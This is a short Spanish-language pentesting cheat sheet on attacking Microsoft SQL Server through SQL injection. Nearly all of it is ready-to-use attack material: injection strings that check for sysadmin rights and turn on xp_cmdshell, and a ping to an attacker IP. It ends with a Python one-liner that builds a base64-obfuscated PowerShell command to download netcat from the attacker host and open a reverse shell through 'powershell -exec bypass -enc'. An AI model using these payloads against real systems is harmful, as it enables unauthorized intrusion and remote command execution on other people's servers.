### INFO
En primera instancia deberemos cerciorarnos de que nuestro user es SA(sysadmin).

    <dato>' AND IS_SRVROLEMEMBER('sysadmin')=1;--

Si la respuesta nos da true, podemos intentar conseguir una shell reversa abusando de xp_cmdshell.

1. Primero habilitamos las advanced options, esta respuesta deberia darnos false sin el dato, true con el dato.

        ';exec sp_configure 'show advanced options','1';reconfigure;--

2. Habilitamos el xp_cmdshell, debería darnos false sin el dato, true con el dato:

        ';exec sp_configure 'xp_cmdshell','1';reconfigure;--

3. Podriamos probar que todo esté funcional y haya conexión enviandonos un ping corriendo previamente tcpdump:

        sudo tcpdump -i <interfaz>

Luego enviamos el ping:

        ';exec xp_cmdshell 'ping /n 4 192.168.43.164';--

4. Si esto funciona, podriamos enviarnos una shell reversa

        ';exec xp_cmdshell '<shell reversa>'.


Podemos usar revshell para generar reverseshells de manera sencilla:

    https://www.revshells.com/
#### En el caso de que la reverse no funcione:

Deberemos subir un netcat u otro binario util para realizar conexiones al servidor

1. Generamos el payload para que se descargue nuestro binario de manera ofuscada y se corra automáticamente:
   
        python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

2. pasamos como comando en la inyección:

       exec xp_cmdshell 'powershell -exec bypass -enc <payload>'
